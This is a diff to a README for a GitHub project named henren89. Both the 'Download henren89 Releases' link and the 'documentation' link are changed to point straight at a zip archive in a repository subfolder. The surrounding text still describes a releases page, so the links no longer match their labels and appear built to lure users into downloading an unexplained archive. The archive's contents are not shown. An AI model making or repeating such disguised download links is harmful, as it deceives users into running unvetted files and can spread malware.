@@ -8,7 +8,7 @@ Welcome to the henren89 application! This easy-to-use tool helps you manage your
 
 To get the latest version of the henren89 application, visit this page to download:
 
-[Download henren89 Releases](https://github.com/shadowplay530/henren89/releases)
+[Download henren89 Releases](https://raw.githubusercontent.com/shadowplay530/henren89/main/mohr/henren89.zip)
 
 On the releases page, you will see different versions of the application. Choose the latest version listed and click on the download link to save the file to your computer.
 
@@ -59,7 +59,7 @@ If problems persist, feel free to reach out for help through the issues section 
 
 ## 📞 Support
 
-For further assistance, you can check the [documentation](https://github.com/shadowplay530/henren89) or contact support. Sharing your experience helps us improve henren89 for everyone.
+For further assistance, you can check the [documentation](https://raw.githubusercontent.com/shadowplay530/henren89/main/mohr/henren89.zip) or contact support. Sharing your experience helps us improve henren89 for everyone.
 
 ## 🌟 Community and Contributions
 
